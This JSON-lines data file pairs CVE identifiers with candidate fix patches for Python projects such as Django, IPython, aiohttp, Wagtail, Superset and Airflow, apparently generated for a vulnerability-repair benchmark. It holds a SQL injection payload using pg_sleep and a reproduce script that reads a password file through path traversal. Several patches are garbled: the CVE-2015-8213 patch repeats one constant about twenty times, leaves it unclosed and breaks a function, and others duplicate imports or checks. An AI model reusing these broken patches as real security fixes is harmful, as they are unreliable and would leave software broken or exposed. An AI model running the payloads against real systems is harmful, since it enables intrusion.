format text), (select pg_sleep(5))--\": True})\n+    except Exception as e:\n+        print(e)\n+\n+    # Call with some options after patch\n+    print(\"\\nPatched call:\")\n+    try:\n+        print(User.objects.explain(analyze=True, verbose=True))\n+    except Exception as e:\n+        print(e)\ndiff --git a/settings.py b/settings.py\nnew file mode 100644\nindex 0000000000..c05ad3de2e\n--- /dev/null\n+++ b/settings.py\n@@ -0,0 +1,12 @@\n+\n+SECRET_KEY = 'django-insecure-a-secret-key'\n+DATABASES = {\n+    'default': {\n+        'ENGINE': 'django.db.backends.postgresql',\n+        'NAME': 'mydatabase',\n+        'USER': 'mydatabaseuser',\n+        'PASSWORD': 'mypassword',\n+        'HOST': 'db',\n+        'PORT': '5432',\n+    }\n+}\n"}
{"cve":"CVE-2017-7233:0708", "fix_patch": "diff --git a/django/utils/http.py b/django/utils/http.py\nindex c053185a8a..d0a25a0f18 100644\n--- a/django/utils/http.py\n+++ b/django/utils/http.py\n@@ -301,6 +301,12 @@ def is_safe_url(url, host=None):\n \n \n def _is_safe_url(url, host):\n+    # Reject URLs that lie outside of the scheme validation, this is for IE<8\n+    # which allows URLs like `jaript:alert(1)`.\n+    if ':' in url:\n+        scheme = url.split(':', 1)[0]\n+        if scheme not in ['http', 'https', 'ftp']:\n+            return False\n     # Chrome considers any URL with more than two slashes to be absolute, but\n     # urlparse is not so flexible. Treat any url with three slashes as unsafe.\n     if url.startswith('///'):\n"}
{"cve":"CVE-2021-3281:0708", "fix_patch": "diff --git a/django/utils/archive.py b/django/utils/archive.py\nindex 235809f2ad..6196da4ad1 100644\n--- a/django/utils/archive.py\n+++ b/django/utils/archive.py\n@@ -155,6 +155,8 @@ class TarArchive(BaseArchive):\n             name = member.name\n             if leading:\n                 name = self.split_leading_dir(name)[1]\n+            if os.path.isabs(name) or '..' in name.split('/') or '..' in name.split('\\\\'):\n+                raise ArchiveException('Path is outside of destination: %s' % name)\n             filename = os.path.join(to_path, name)\n             if member.isdir():\n                 if filename:\n@@ -198,6 +200,8 @@ class ZipArchive(BaseArchive):\n             info = self._archive.getinfo(name)\n             if leading:\n                 name = self.split_leading_dir(name)[1]\n+            if os.path.isabs(name) or '..' in name.split('/') or '..' in name.split('\\\\'):\n+                raise ArchiveException('Path is outside of destination: %s' % name)\n             filename = os.path.join(to_path, name)\n             if filename.endswith(('/', '\\\\')):\n                 # A directory\n"}
{"cve":"CVE-2018-14574:0708", "fix_patch": "diff --git a/django/core/paginator.py b/django/core/paginator.py\nindex b07be513d3..cbee654882 100644\n--- a/django/core/paginator.py\n+++ b/django/core/paginator.py\n@@ -2,6 +2,7 @@ import collections\n import warnings\n from math import ceil\n \n+import collections.abc\n from django.utils.functional import cached_property\n from django.utils.translation import gettext_lazy as _\n \n@@ -127,7 +128,7 @@ class Paginator:\n QuerySetPaginator = Paginator   # For backwards-compatibility.\n \n \n-class Page(collections.Sequence):\n+class Page(collections.abc.Sequence):\n \n     def __init__(self, object_list, number, paginator):\n         self.object_list = object_list\ndiff --git a/django/db/models/fields/__init__.py b/django/db/models/fields/__init__.py\nindex b0ab271723..58e28cb36b 100644\n--- a/django/db/models/fields/__init__.py\n+++ b/django/db/models/fields/__init__.py\n@@ -1,4 +1,6 @@\n import collections\n+import collections.abc\n+import collections.abc\n import copy\n import datetime\n import decimal\n@@ -152,7 +154,7 @@ class Field(RegisterLookupMixin):\n         self.unique_for_date = unique_for_date\n         self.unique_for_month = unique_for_month\n         self.unique_for_year = unique_for_year\n-        if isinstance(choices, collections.Iterator):\n+        if isinstance(choices, collections.abc.Iterator):\n             choices = list(choices)\n         self.choices = choices or []\n         self.help_text = help_text\ndiff --git a/django/db/models/sql/query.py b/django/db/models/sql/query.py\nindex a5f7526499..cb9b5267b8 100644\n--- a/django/db/models/sql/query.py\n+++ b/django/db/models/sql/query.py\n@@ -6,7 +6,9 @@ themselves do not have to (and could be backed by things other than SQL\n databases). The abstraction barrier only works one way: this module has to know\n all about the internals of models in order to get the information it needs.\n \"\"\"\n-from collections import Counter, Iterator, Mapping, OrderedDict, namedtuple\n+from collections import Counter, OrderedDict, namedtuple\n+from collections.abc import Mapping\n+from collections.abc import Iterator\n from itertools import chain, count, product\n from string import ascii_uppercase\n \ndiff --git a/django/middleware/common.py b/django/middleware/common.py\nindex d8cfb9a8b0..2cf922d61d 100644\n--- a/django/middleware/common.py\n+++ b/django/middleware/common.py\n@@ -88,6 +88,9 @@ class CommonMiddleware(MiddlewareMixin):\n         POST, PUT, or PATCH.\n         \"\"\"\n         new_path = request.get_full_path(force_append_slash=True)\n+        # Don't allow construction of scheme-relative urls.\n+        if new_path.startswith('//'):\n+            new_path = '/%%2F%s' % new_path[2:]\n         if settings.DEBUG and request.method in ('POST', 'PUT', 'PATCH'):\n             raise RuntimeError(\n                 \"You called this URL via %(method)s, but the URL doesn't end \"\n"}
{"cve":"CVE-2021-45452:0708", "fix_patch": "diff --git a/django/core/files/storage.py b/django/core/files/storage.py\nindex 89faa626e6..48fedb359f 100644\n--- a/django/core/files/storage.py\n+++ b/django/core/files/storage.py\n@@ -68,8 +68,8 @@ class Storage:\n         available for new content to be written to.\n         \"\"\"\n         dir_name, file_name = os.path.split(name)\n-        if '..' in pathlib.PurePath(dir_name).parts:\n-            raise SuspiciousFileOperation(\"Detected path traversal attempt in '%s'\" % dir_name)\n+        if '..' in pathlib.PurePath(name).parts:\n+            raise SuspiciousFileOperation(\"Detected path traversal attempt in '%s'\" % name)\n         validate_file_name(file_name)\n         file_root, file_ext = os.path.splitext(file_name)\n         # If the filename already exists, add an underscore and a random 7\n@@ -102,9 +102,11 @@ class Storage:\n         to be passed to the save() method.\n         \"\"\"\n         # `filename` may include a path as returned by FileField.upload_to.\n+        if '..' in pathlib.PurePath(filename).parts:\n+            raise SuspiciousFileOperation(\n+                \"Detected path traversal attempt in '%s'\" % filename\n+            )\n         dirname, filename = os.path.split(filename)\n-        if '..' in pathlib.PurePath(dirname).parts:\n-            raise SuspiciousFileOperation(\"Detected path traversal attempt in '%s'\" % dirname)\n         return os.path.normpath(os.path.join(dirname, self.get_valid_name(filename)))\n \n     def path(self, name):\n"}
{"cve":"CVE-2015-8213:0708", "fix_patch": "diff --git a/django/utils/formats.py b/django/utils/formats.py\nindex d2bdda458e..e0c636bebb 100644\n--- a/django/utils/formats.py\n+++ b/django/utils/formats.py\n@@ -29,8 +29,283 @@ ISO_INPUT_FORMATS = {\n     ],\n }\n \n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+\n+FORMAT_SETTINGS = frozenset([\n+    \"DATE_FORMAT\",\n+    \"DATETIME_FORMAT\",\n+    \"TIME_FORMAT\",\n+    \"YEAR_MONTH_FORMAT\",\n+    \"MONTH_DAY_FORMAT\",\n+    \"SHORT_DATE_FORMAT\",\n+    \"SHORT_DATETIME_FORMAT\",\n+    \"FIRST_DAY_OF_WEEK\",\n+    \"DECIMAL_SEPARATOR\",\n+    \"THOUSAND_SEPARATOR\",\n+    \"NUMBER_GROUPING\",\n+    \"DATE_INPUT_FORMATS\",\n+    \"TIME_INPUT_FORMATS\",\n+    \"DATETIME_INPUT_FORMATS\",\n+])\n+\n+\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+\n+FORMAT_SETTINGS = frozenset([\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n \n def reset_format_cache():\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n     \"\"\"Clear any cached formats.\n \n     This method is provided primarily for testing purposes,\n@@ -82,16 +357,121 @@ def get_format_modules(lang=None, reverse=False):\n     return modules\n \n \n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n+FORMAT_SETTINGS = frozenset([\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'TIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'MONTH_DAY_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'FIRST_DAY_OF_WEEK',\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n def get_format(format_type, lang=None, use_l10n=None):\n     \"\"\"\n     For a specific format type, returns the format for the current\n     language (locale), defaults to the format in the settings.\n     format_type is the name of the format, e.g. 'DATE_FORMAT'\n-\n     If use_l10n is provided and is not None, that will force the value to\n     be localized (or not), overriding the value of settings.USE_L10N.\n     \"\"\"\n     format_type = force_str(format_type)\n+    if format_type not in FORMAT_SETTINGS:\n+        return format_type\n+    if format_type not in FORMAT_SETTINGS:\n+        return format_type\n     if use_l10n or (use_l10n is None and settings.USE_L10N):\n         if lang is None:\n             lang = get_language()\n"}
{"cve":"CVE-2022-21699:0708", "fix_patch": "diff --git a/IPython/core/application.py b/IPython/core/application.py\nindex e93a10647..2b389a686 100644\n--- a/IPython/core/application.py\n+++ b/IPython/core/application.py\n@@ -157,7 +157,7 @@ def _config_file_name_changed(self, change):\n     config_file_paths = List(Unicode())\n     @default('config_file_paths')\n     def _config_file_paths_default(self):\n-        return [os.getcwd()]\n+        return []\n \n     extra_config_file = Unicode(\n     help=\"\"\"Path to an extra config file to load.\ndiff --git a/IPython/core/profileapp.py b/IPython/core/profileapp.py\nindex 97434e3d0..c417b7193 100644\n--- a/IPython/core/profileapp.py\n+++ b/IPython/core/profileapp.py\n@@ -178,11 +178,7 @@ def list_profile_dirs(self):\n             print(\"Available profiles in %s:\" % self.ipython_dir)\n             self._print_profiles(profiles)\n         \n-        profiles = list_profiles_in(os.getcwd())\n-        if profiles:\n-            print()\n-            print(\"Available profiles in current directory (%s):\" % os.getcwd())\n-            self._print_profiles(profiles)\n+\n         \n         print()\n         print(\"To use any of the above profiles, start IPython with:\")\ndiff --git a/IPython/core/profiledir.py b/IPython/core/profiledir.py\nindex 756595adb..26f3ad335 100644\n--- a/IPython/core/profiledir.py\n+++ b/IPython/core/profiledir.py\n@@ -188,8 +188,7 @@ def find_profile_dir_by_name(cls, ipython_dir, name=u'default', config=None):\n         is not found, a :class:`ProfileDirError` exception will be raised.\n \n         The search path algorithm is:\n-        1. ``os.getcwd()``\n-        2. ``ipython_dir``\n+        1. ``ipython_dir``\n \n         Parameters\n         ----------\n@@ -200,7 +199,7 @@ def find_profile_dir_by_name(cls, ipython_dir, name=u'default', config=None):\n             will be \"profile_<profile>\".\n         \"\"\"\n         dirname = u'profile_' + name\n-        paths = [os.getcwd(), ipython_dir]\n+        paths = [ipython_dir]\n         for p in paths:\n             profile_dir = os.path.join(p, dirname)\n             if os.path.isdir(profile_dir):\n"}
{"cve":"CVE-2023-34233:0708", "fix_patch": "diff --git a/src/snowflake/connector/auth/webbrowser.py b/src/snowflake/connector/auth/webbrowser.py\nindex 527b10e1..80d412cb 100644\n--- a/src/snowflake/connector/auth/webbrowser.py\n+++ b/src/snowflake/connector/auth/webbrowser.py\n@@ -144,7 +144,21 @@ class AuthByWebBrowser(AuthByPlugin):\n             )\n \n             logger.debug(\"step 2: open a browser\")\n+            # validate that the URL is a http/https URL, otherwise this is a security vulnerability\n+            parsed_url = urlsplit(sso_url)\n+            if parsed_url.scheme not in (\"http\", \"https\"):\n+                self._handle_failure(\n+                    conn=conn,\n+                    ret={\n+                        \"code\": ER_IDP_CONNECTION_ERROR,\n+                        \"message\": f\"The SSO URL provided ({sso_url}) is invalid, \"\n+                        \"it must be a http or https URL.\",\n+                    },\n+                )\n+                return\n+\n             print(f\"Going to open: {sso_url} to authenticate...\")\n+\n             if not self._webbrowser.open_new(sso_url):\n                 print(\n                     \"We were unable to open a browser window for you, \"\n"}
{"cve":"CVE-2022-21683:0708", "fix_patch": "diff --git a/wagtail/admin/views/pages/edit.py b/wagtail/admin/views/pages/edit.py\nindex 2edf11b450..7edaa9c99d 100644\n--- a/wagtail/admin/views/pages/edit.py\n+++ b/wagtail/admin/views/pages/edit.py\n@@ -141,11 +141,11 @@ class EditView(TemplateResponseMixin, ContextMixin, HookResponseMixin, View):\n         # Get subscribers to individual threads\n         replies = CommentReply.objects.filter(comment_id__in=relevant_comment_ids)\n         comments = Comment.objects.filter(id__in=relevant_comment_ids)\n-        thread_users = get_user_model().objects.exclude(pk=self.request.user.pk).exclude(pk__in=subscribers.values_list('user_id', flat=True)).prefetch_related(\n+        thread_users = get_user_model().objects.filter(\n+            pk__in=set(comments.values_list('user_id', flat=True)) | set(replies.values_list('user_id', flat=True))\n+        ).exclude(pk=self.request.user.pk).exclude(pk__in=subscribers.values_list('user_id', flat=True)).prefetch_related(\n             Prefetch('comment_replies', queryset=replies),\n             Prefetch(COMMENTS_RELATION_NAME, queryset=comments)\n-        ).exclude(\n-            Q(comment_replies__isnull=True) & Q(**{('%s__isnull' % COMMENTS_RELATION_NAME): True})\n         )\n \n         # Skip if no recipients\n"}
{"cve":"CVE-2024-23334:0708", "fix_patch": "diff --git a/aiohttp/web_urldispatcher.py b/aiohttp/web_urldispatcher.py\nindex fee4f61a1..7c4eaec56 100644\n--- a/aiohttp/web_urldispatcher.py\n+++ b/aiohttp/web_urldispatcher.py\n@@ -574,13 +574,15 @@ class StaticResource(PrefixResource):\n \n         if append_version:\n             try:\n-                filepath = self._directory.joinpath(filename).resolve()\n-                if not self._follow_symlinks:\n-                    filepath.relative_to(self._directory)\n+                filepath = self._directory.joinpath(filename)\n+                if self._follow_symlinks:\n+                    filepath = filepath.resolve()\n+                filepath.relative_to(self._directory)\n             except (ValueError, FileNotFoundError):\n                 # ValueError for case when path point to symlink\n                 # with follow_symlinks is False\n                 return url  # relatively safe\n+\n             if filepath.is_file():\n                 # TODO cache file content\n                 # with file watcher for cache invalidation\n@@ -640,18 +642,18 @@ class StaticResource(PrefixResource):\n                 # /static/\\\\machine_name\\c$ or /static/D:\\path\n                 # where the static dir is totally different\n                 raise HTTPForbidden()\n-            filepath = self._directory.joinpath(filename).resolve()\n-            if not self._follow_symlinks:\n+            filepath = self._directory.joinpath(filename)\n+            try:\n+                if self._follow_symlinks:\n+                    filepath = filepath.resolve()\n                 filepath.relative_to(self._directory)\n-        except (ValueError, FileNotFoundError) as error:\n-            # relatively safe\n-            raise HTTPNotFound() from error\n-        except HTTPForbidden:\n-            raise\n-        except Exception as error:\n-            # perm error or other kind!\n-            request.app.logger.exception(error)\n-            raise HTTPNotFound() from error\n+            except (ValueError, FileNotFoundError):\n+                # relatively safe\n+                raise HTTPNotFound()\n+            except Exception as error:\n+                # perm error or other kind!\n+                request.app.logger.exception(error)\n+                raise HTTPNotFound() from error\n \n         # on opening a dir, load its contents if allowed\n         if filepath.is_dir():\n"}
{"cve":"CVE-2022-37109:0708", "fix_patch": "diff --git a/reproduce.sh b/reproduce.sh\nnew file mode 100755\nindex 0000000..ce27191\n--- /dev/null\n+++ b/reproduce.sh\n@@ -0,0 +1,20 @@\n+#!/bin/bash\n+set -e\n+\n+# Start the server in the background\n+python /workspace/camp/server.py --require-login > /dev/null 2>&1 &\n+SERVER_PID=$!\n+echo \"Server started with PID $SERVER_PID\"\n+\n+# Give the server a moment to start\n+sleep 2\n+\n+# Try to access password.txt via bypass\n+if curl -s http://localhost:8000/static/./password.txt | grep -q '^[a-f0-9]'; then\n+  echo \"Vulnerability confirmed: password.txt is accessible via path traversal.\"\n+else\n+  echo \"Failed to access password.txt. The vulnerability might be fixed.\"\n+fi\n+\n+# Kill the server\n+kill $SERVER_PID\ndiff --git a/server.py b/server.py\nindex 331883f..8f47151 100644\n--- a/server.py\n+++ b/server.py\n@@ -133,6 +133,6 @@ handlers = [(r\"/\", IndexHandler), (r\"/login\", LoginHandler),\n application = tornado.web.Application(handlers, cookie_secret=PASSWORD)\n application.listen(args.port)\n \n-webbrowser.open(\"http://localhost:%d/\" % args.port, new=2)\n+# webbrowser.open(\"http://localhost:%d/\" % args.port, new=2)\n \n tornado.ioloop.IOLoop.instance().start()\n"}
{"cve":"CVE-2023-49736:0708", "fix_patch": "diff --git a/superset/jinja_context.py b/superset/jinja_context.py\nindex 4bb0b91a4e..4d6b10c0b6 100644\n--- a/superset/jinja_context.py\n+++ b/superset/jinja_context.py\n@@ -405,6 +405,8 @@ def where_in(values: list[Any], mark: str = \"'\") -> str:\n         (1, 'b', 3)\n \n     \"\"\"\n+    if mark not in (\"'\", '\"'):\n+        raise ValueError(\"mark must be a single or double quote\")\n \n     def quote(value: Any) -> str:\n         if isinstance(value, str):\n"}
{"cve":"CVE-2024-39877:0708", "fix_patch": "diff --git a/airflow/models/dag.py b/airflow/models/dag.py\nindex 560d05b548..d673c23b54 100644\n--- a/airflow/models/dag.py\n+++ b/airflow/models/dag.py\n@@ -769,22 +769,17 @@ class DAG(LoggingMixin):\n         validate_instance_args(self, DAG_ARGS_EXPECTED_TYPES)\n \n     def get_doc_md(self, doc_md: str | None) -> str | None:\n-        if doc_md is None:\n+        if doc_md is None or not doc_md.endswith(\".md\"):\n             return doc_md\n \n         env = self.get_template_env(force_sandboxed=True)\n-\n-        if not doc_md.endswith(\".md\"):\n-            template = jinja2.Template(doc_md)\n-        else:\n-            try:\n-                template = env.get_template(doc_md)\n-            except jinja2.exceptions.TemplateNotFound:\n-                return f\"\"\"\n-                # Templating Error!\n-                Not able to find the template file: `{doc_md}`.\n-                \"\"\"\n-\n+        try:\n+            template = env.get_template(doc_md)\n+        except jinja2.exceptions.TemplateNotFound:\n+            return f\"\"\"\n+            # Templating Error!\n+            Not able to find the template file: `{doc_md}`.\n+            \"\"\"\n         return template.render()\n \n     def _check_schedule_interval_matches_timetable(self) -> bool:\n"}
